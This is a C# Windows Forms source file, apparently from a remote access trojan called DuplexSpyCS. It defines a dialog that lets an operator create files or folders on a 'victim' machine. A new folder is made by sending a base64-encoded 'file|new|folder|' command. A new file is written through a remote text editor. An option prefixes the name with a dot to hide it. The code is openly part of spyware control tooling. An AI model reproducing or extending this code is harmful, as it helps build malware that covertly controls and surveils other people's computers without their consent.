using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmFileMgrNew : Form
    {
        public clsVictim v;
        public bool folder = false;
        public string dir;

        public frmFileMgrNew()
        {
            InitializeComponent();
        }

        void setup()
        {
            if (folder)
                radioButton1.Checked = true;
            else
                radioButton2.Checked = true;
        }

        private void frmFileMgrNew_Load(object sender, EventArgs e)
        {
            setup();
        }

        //GENERATE NEW FILE NAME
        private void button2_Click(object sender, EventArgs e)
        {
            textBox1.Text = radioButton1.Checked ? clsTools.GenerateFileName() : clsTools.GenerateFileName("txt");
        }

        //NEW
        private void button1_Click(object sender, EventArgs e)
        {
            string name = textBox1.Text;
            name = checkBox1.Checked && name[0] != '.' ? "." + name : name;

            if (radioButton1.Checked) //FOLDER
            {
                v.fnSendCommand("file|new|folder|" + clsCrypto.b64E2Str(Path.Combine(dir, name)));
            }
            else //FILE
            {
                frmTextEditor f = new frmTextEditor();
                f.v = v;
                f.Tag = Function.TextEditor;
                f.Text = $@"TextEditor\\{v.ID}";
                f.currentDir = dir;
                f.Show();
                f.ShowTextFile(Path.Combine(dir, name), string.Empty);
            }
        }
    }
}
